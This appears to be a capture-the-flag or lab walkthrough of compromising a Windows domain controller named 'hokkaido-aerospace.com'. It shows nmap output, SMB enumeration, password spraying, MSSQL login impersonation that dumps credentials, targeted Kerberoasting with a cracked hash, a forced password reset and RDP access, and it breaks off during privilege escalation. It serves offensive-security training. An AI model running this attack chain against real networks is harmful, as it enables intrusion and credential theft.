+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-07-03T07:03:16+00:00; -58s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: HAERO
+|   NetBIOS_Domain_Name: HAERO
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: hokkaido-aerospace.com
+|   DNS_Computer_Name: dc.hokkaido-aerospace.com
+|   DNS_Tree_Name: hokkaido-aerospace.com
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-07-03T07:03:08+00:00
+| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
+| Not valid before: 2025-07-02T06:59:10
+|_Not valid after:  2026-01-01T06:59:10
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8530/tcp  open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: 403 - Forbidden: Access is denied.
+8531/tcp  open  unknown
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  msrpc         Microsoft Windows RPC
+49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49685/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+49700/tcp open  msrpc         Microsoft Windows RPC
+49701/tcp open  msrpc         Microsoft Windows RPC
+49712/tcp open  msrpc         Microsoft Windows RPC
+58538/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   192.168.154.40:58538: 
+|     Target_Name: HAERO
+|     NetBIOS_Domain_Name: HAERO
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: hokkaido-aerospace.com
+|     DNS_Computer_Name: dc.hokkaido-aerospace.com
+|     DNS_Tree_Name: hokkaido-aerospace.com
+|_    Product_Version: 10.0.20348
+| ms-sql-info: 
+|   192.168.154.40:58538: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 58538
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-08-02T02:28:44
+|_Not valid after:  2054-08-02T02:28:44
+|_ssl-date: 2025-07-03T07:03:17+00:00; -58s from scanner time.
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=7/3%OT=53%CT=1%CU=37631%PV=Y%DS=4%DC=T%G=Y%TM=68662B70
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=10
+OS:4%GCD=1%ISR=108%TI=I%CI=I%TS=A)SEQ(SP=107%GCD=1%ISR=106%TI=I%CI=I%TS=A)S
+OS:EQ(SP=108%GCD=1%ISR=109%TI=I%CI=I%TS=A)SEQ(SP=FF%GCD=1%ISR=101%TI=I%CI=I
+OS:%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O
+OS:5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
+OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
+OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
+OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
+OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G
+OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=N)
+
+Network Distance: 4 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-07-03T07:03:09
+|_  start_date: N/A
+|_clock-skew: mean: -58s, deviation: 0s, median: -58s
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   75.90 ms 192.168.45.1
+2   75.42 ms 192.168.45.254
+3   76.31 ms 192.168.251.1
+4   77.00 ms 192.168.154.40
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 122.78 seconds
+
+An assumed breached user info/info was provided
+
+I used this to enumerate and get list of other AD users
+
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ nxc smb 192.168.154.40 -u info -p info --users
+SMB         192.168.154.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False) 
+SMB         192.168.154.40  445    DC               [+] hokkaido-aerospace.com\info:info 
+SMB         192.168.154.40  445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         192.168.154.40  445    DC               Administrator                 2023-12-06 15:56:28 0       Built-in account for administering the computer/domain 
+SMB         192.168.154.40  445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         192.168.154.40  445    DC               krbtgt                        2023-11-25 13:11:55 0       Key Distribution Center Service Account 
+SMB         192.168.154.40  445    DC               Hazel.Green                   2023-12-06 16:34:46 0        
+SMB         192.168.154.40  445    DC               Molly.Smith                   2023-11-25 13:34:13 0        
+SMB         192.168.154.40  445    DC               Alexandra.Little              2023-11-25 13:34:13 0        
+SMB         192.168.154.40  445    DC               Victor.Kelly                  2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Catherine.Knight              2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Angela.Davies                 2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Molly.Edwards                 2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Tracy.Wood                    2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Lynne.Tyler                   2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Charlene.Wallace              2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Cheryl.Singh                  2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Sian.Gordon                   2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Gordon.Brown                  2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Irene.Dean                    2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Anthony.Anderson              2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Julian.Davies                 2023-11-25 13:34:17 0        
+SMB         192.168.154.40  445    DC               Hannah.O'Neill                2023-11-25 13:34:18 0        
+SMB         192.168.154.40  445    DC               Rachel.Jones                  2023-11-25 13:34:18 0        
+SMB         192.168.154.40  445    DC               Declan.Woodward               2023-11-25 13:34:18 0        
+SMB         192.168.154.40  445    DC               Annette.Buckley               2023-11-25 13:34:18 0        
+SMB         192.168.154.40  445    DC               Elliott.Jones                 2023-11-25 13:34:18 0        
+SMB         192.168.154.40  445    DC               Grace.Lees                    2023-11-25 13:34:18 0        
+SMB         192.168.154.40  445    DC               Deborah.Francis               2023-11-25 13:34:18 0        
+SMB         192.168.154.40  445    DC               Bruce.Cartwright              2023-11-25 13:34:21 0        
+SMB         192.168.154.40  445    DC               Nigel.Brown                   2023-11-25 13:34:21 0        
+SMB         192.168.154.40  445    DC               Derek.Wyatt                   2023-11-25 13:34:21 0        
+SMB         192.168.154.40  445    DC               discovery                     2023-12-06 15:42:56 0        
+SMB         192.168.154.40  445    DC               maintenance                   2023-11-25 13:39:04 0        
+SMB         192.168.154.40  445    DC               hrapp-service                 2023-11-25 14:14:40 0        
+SMB         192.168.154.40  445    DC               info                          2023-12-06 15:43:50 0        
+SMB         192.168.154.40  445    DC               [*] Enumerated 33 local users: HAERO
+
+I also enumerated shares for this user and one of the shares showed a password file that contains a password that belongs the user user discorvery.
+
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ nxc smb 192.168.154.40 -u info -p info --shares          
+SMB         192.168.154.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False) 
+SMB         192.168.154.40  445    DC               [+] hokkaido-aerospace.com\info:info 
+SMB         192.168.154.40  445    DC               [*] Enumerated shares
+SMB         192.168.154.40  445    DC               Share           Permissions     Remark
+SMB         192.168.154.40  445    DC               -----           -----------     ------
+SMB         192.168.154.40  445    DC               ADMIN$                          Remote Admin
+SMB         192.168.154.40  445    DC               C$                              Default share
+SMB         192.168.154.40  445    DC               homes           READ,WRITE      user homes
+SMB         192.168.154.40  445    DC               IPC$            READ            Remote IPC
+SMB         192.168.154.40  445    DC               NETLOGON        READ            Logon server share 
+SMB         192.168.154.40  445    DC               SYSVOL          READ            Logon server share 
+SMB         192.168.154.40  445    DC               UpdateServicesPackages READ            A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.                                                                                                                                                            
+SMB         192.168.154.40  445    DC               WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.
+SMB         192.168.154.40  445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
+
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ nxc smb 192.168.154.40 -u info -p info --spider NETLOGON --regex .
+SMB         192.168.154.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False) 
+SMB         192.168.154.40  445    DC               [+] hokkaido-aerospace.com\info:info 
+SMB         192.168.154.40  445    DC               [*] Started spidering
+SMB         192.168.154.40  445    DC               [*] Spidering .
+SMB         192.168.154.40  445    DC               //192.168.154.40/NETLOGON/. [dir]
+SMB         192.168.154.40  445    DC               //192.168.154.40/NETLOGON/.. [dir]
+SMB         192.168.154.40  445    DC               //192.168.154.40/NETLOGON/temp [dir]
+SMB         192.168.154.40  445    DC               //192.168.154.40/NETLOGON/temp/. [dir]
+SMB         192.168.154.40  445    DC               //192.168.154.40/NETLOGON/temp/.. [dir]
+SMB         192.168.154.40  445    DC               //192.168.154.40/NETLOGON/temp/password_reset.txt [lastm:'2023-12-06 16:44' size:27]
+SMB         192.168.154.40  445    DC               [*] Done spidering (Completed in 0.5551407337188721)
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ smbclient \\\\192.168.154.40\\NETLOGON -U info
+Password for [WORKGROUP\info]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Nov 25 14:40:08 2023
+  ..                                  D        0  Sat Nov 25 14:17:33 2023
+  temp                                D        0  Wed Dec  6 16:44:26 2023
+
+                7699711 blocks of size 4096. 1917133 blocks available
+smb: \> cd temp
+smb: \temp\> ls
+  .                                   D        0  Wed Dec  6 16:44:26 2023
+  ..                                  D        0  Sat Nov 25 14:40:08 2023
+  password_reset.txt                  A       27  Sat Nov 25 14:40:29 2023
+
+                7699711 blocks of size 4096. 1917069 blocks available
+smb: \temp\> get password_reset.txt
+getting file \temp\password_reset.txt of size 27 as password_reset.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \temp\> exit
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ cat password_reset.txt                                           
+Initial Password: Start123!                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ nano pass.txt                                                     
+                                                    
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ nxc smb 192.168.154.40 -u user.txt -p pass.txt --continue-on-success
+SMB         192.168.154.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False) 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Administrator:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Guest:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\krbtgt:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Hazel.Green:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Molly.Smith:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Alexandra.Little:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Victor.Kelly:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Catherine.Knight:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Angela.Davies:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Molly.Edwards:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Tracy.Wood:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Lynne.Tyler:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Charlene.Wallace:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Cheryl.Singh:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Sian.Gordon:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Gordon.Brown:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Irene.Dean:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Anthony.Anderson:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Julian.Davies:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Hannah.O'Neill:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Rachel.Jones:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Declan.Woodward:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Annette.Buckley:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Elliott.Jones:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Grace.Lees:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Deborah.Francis:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Bruce.Cartwright:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Nigel.Brown:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Derek.Wyatt:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [+] hokkaido-aerospace.com\discovery:Start123! 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\maintenance:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\hrapp-service:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\info:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\:Start123! STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Administrator:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Guest:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\krbtgt:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Hazel.Green:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Molly.Smith:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Alexandra.Little:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Victor.Kelly:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Catherine.Knight:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Angela.Davies:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Molly.Edwards:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Tracy.Wood:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Lynne.Tyler:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Charlene.Wallace:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Cheryl.Singh:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Sian.Gordon:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Gordon.Brown:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Irene.Dean:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Anthony.Anderson:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Julian.Davies:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Hannah.O'Neill:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Rachel.Jones:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Declan.Woodward:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Annette.Buckley:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Elliott.Jones:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Grace.Lees:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Deborah.Francis:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Bruce.Cartwright:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Nigel.Brown:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\Derek.Wyatt:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\maintenance:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\hrapp-service:info STATUS_LOGON_FAILURE 
+SMB         192.168.154.40  445    DC               [+] hokkaido-aerospace.com\info:info 
+SMB         192.168.154.40  445    DC               [-] hokkaido-aerospace.com\:info STATUS_LOGON_FAILURE 
+
+ 
+# I checked what I can do with this user, but it seems it have same access as the info user on the open ports. However according to bloodhound, the user also belongs to the service group. I attempted to use it to get access on the mssql service to read information from a database that I could not access earlier with both the user and the info user,  and it worked. 
+
+─$ impacket-mssqlclient discovery:'Start123!'@192.168.154.40 -windows-auth
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (HAERO\discovery  guest@master)> enable_xp_cmdshell
+ERROR(DC\SQLEXPRESS): Line 105: User does not have permission to perform this action.
+ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
+ERROR(DC\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
+SQL (HAERO\discovery  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+name             
+--------------   
+hrappdb-reader   
+
+SQL (HAERO\discovery  guest@master)> EXECUTE AS LOGIN = 'hrappdb-reader'
+SQL (hrappdb-reader  guest@master)> enum_db
+name      is_trustworthy_on   
+-------   -----------------   
+master                    0   
+
+tempdb                    0   
+
+model                     0   
+
+msdb                      1   
+
+hrappdb                   0   
+
+SQL (hrappdb-reader  guest@master)> use hrappdb
+ENVCHANGE(DATABASE): Old Value: master, New Value: hrappdb
+INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.
+SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM tempdb.information_schema.tables;
+TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
+-------------   ------------   ----------   ----------   
+tempdb          dbo            #A0F49296    b'BASE TABLE'   
+
+SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM hrappdb.information_schema.tables;
+TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
+-------------   ------------   ----------   ----------   
+hrappdb         dbo            sysauth      b'BASE TABLE'   
+
+SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM hrappdb.dbo.sysauth;
+id   name               password           
+--   ----------------   ----------------   
+ 0   b'hrapp-service'   b'Untimed$Runny'   
+
+SQL (hrappdb-reader  hrappdb-reader@hrappdb)> exit
+
+     
+I found the pass for the hrapp-service account. Accoording to bloodhound, this user have generic right permission on Hazel.Green who is a tier 2 administrator on the domain and also a member of the IT team. I used the permission to target kerbroast hazels's account.
+
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ ./targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.154.40
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (Hazel.Green)
+[+] Printing hash for (Hazel.Green)
+$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$2080f0f7f57f8669210b34fd594733c6$6a8c62f31dc21a901200aac80751bc3d1e6b4b0387e21385f7b3daae54a3fa269382d6d185361114c5b991f714112b9cd6ffbe048420fbdbde51bf66c5f1704832f3f0417473714e16f685c6ee58635550dbef37959cf77fac3bcf87b713b311c5c4d54093da7d0dfc7411079f8fc1078585efebcba3bd4f7d9715535158a3a96c21ba04f049da3d2b5c00a86fbc7195cf83fe47f16c0c79532da21f2eb9a30dd12d3f85267432f4a615ae8cb9240a693aba0711fe4adff123c09708de34d1881f6877d878aa53fcc15ef344f34560c42b03345ac60a34684499fc4a3d38f71571ab76df8395631e14751a6b80bcc01d1ac04cce37cf548959b9ffa42d583c578952b041139b74b400d4e2bf1b728e218d68bf216737e361fa86d154ae788dacef06c2c6b35fb7d3080a56054fe7c5215776ea50eed5fc460005f6c426c6f5702a1e18e30ce1aa33c258058b1d9b6c19e66683888633452a01c0b5b70b943618f6af3be97621336ecac6edc4a400f3203d61f6a63aa7b180126aaa9d287a3ffea056406cae7a851b9792688945607c2f2c692c6287bf2883167a8b5baf8225f5504281d1d440fbaecf65781c5bdf37ca6cb23d42bfdd8a627651451ef94fb2f8158e3e38fdbb36d1fcaea7d7f47c6e4f8d2bfb7bebbe6d40f60b4318a61709120d7e4f98fe611f6017af18e3d960f093d8e0aa4b86078c3a0ba6f17c0d98ad6043e8ed1ab4dd46f39751f8800a8acb8bc6c0dcdd60fdd38cd18e52d011bf3a4a4d9140c716f7ab8dd59863596a92f0fb783bcbba4a6b8f19d0a4bca205c6f6eca35485ab22adfe981f092bdaf9ec91cc4d248dc7afaf77a802f9e70e548ef2ee01198fa667f69b9a7dfbe9e1a43eb68f7b9a94e9770eb74aee55a0363804116820eb6ed3161f6222251d460652fee27fb5f350ed7cbb4be0de3cf40911231569b2d75d468ba526cbfb83cfd1faa1ed75541fdd66fba2c20cbd93605aad098eb87e400f08c2b5248a6915062aad74f360a57125fceb542781910029a5bd2c1173a6ef5fdace86732485865c10509404cb6f8feb4d3ed84087d3b366b9eba262890106bfde31e5ed6d612f934158fcf6969bd5134c454f4ee9a28693e165f70da9dfc47e5c881df21ae55cf023d4841b6de8d18f47b95d83ef44b86d66f72baf127c36f39c667dab44c1c5f0bef59b078beb34767010b3acf9bdd1e1b80c26a0a0e615c90f7df5149f2f292bb83340def59f595db65afd8d86d4c3f38285e5091207abf81487f4b2e9e50e621dc5987ef11c11f2903b33178beaad252db691a62525086116b72e286bb13730decbe8092ba27c6b76f51d65f63fc3bc0d32a149cef45582057fea5fd4d55241a58842b6b5390674c89b227223f0ab8460a149319b3e100cb3fb7e53ae23681907dc68ee91e40169baf1e71a16c93f8b3467aa4a2d1643500a74bf8b65f6e970731e8c710df7cd16416ced1a7c804d7442780ab03a782edf860b7d7baba51a95154d6e2b84d2750ac8aaa702723569267ab3201d7b909126be4315818ddf43dcf93190f64c3124dfa672098df8453b524ad756fb31741926722c221b9fae7699138dea4885ddcb7ea5bc2531e3d2ba00dda8b711a738411f6b1d35b09a189b8d40
+[VERBOSE] SPN removed successfully for (Hazel.Green)
+
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ john hazel.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+haze1988         (?)     
+1g 0:00:00:02 DONE (2025-07-03 11:55) 0.3344g/s 2562Kp/s 2562Kc/s 2562KC/s hazel564..hayvale
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+#Bloodhound also indicated that the only user that can rdp into the machine is molly.smith who is also a member of IT and a tier 1 admin.
+
+I used hazel's account to forcefully change the password of molly.smith and was able to rdp into the machine.
+
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ net rpc password "Molly.Smith" "supersecurep@ssword123" --user='hokkaido-aerospace.com/Hazel.Green%haze1988' -S 192.168.154.40
+                                                                                                                                                                                                                                                                                                                                                         
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ xfreerdp /u:molly.smith /p:supersecurep@ssword123 /v:192.168.154.40
+
+I opened PowerShell as admin with molly's creds and exploited the seebackupprivilege permission
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> cd ..
+PS C:\Windows> cd ..
+PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        11/25/2023   6:57 AM                homes
+d-----        11/25/2023   5:01 AM                inetpub
+d-----          5/8/2021   1:20 AM                PerfLogs
+d-r---        11/25/2023   5:54 AM                Program Files
+d-----        11/25/2023   5:53 AM                Program Files (x86)
+d-----        11/25/2023   5:44 AM                SQL2019
+d-r---          7/3/2025   3:14 AM                Users
+d-----         12/6/2023   7:54 AM                Windows
+d-----        11/25/2023   5:29 AM                WSUS
+-a----          7/3/2025   3:11 AM             34 local.txt
+-a----          7/3/2025   3:10 AM            854 output.txt
+
+
+PS C:\> cat local.txt
+7af12ca44b28ff149b164297644b9494
+PS C:\> cd users
+PS C:\users> cd administrator
+PS C:\users\administrator> ls
+ls : Access to the path 'C:\users\administrator' is denied.
+At line:1 char:1
++ ls
++ ~~
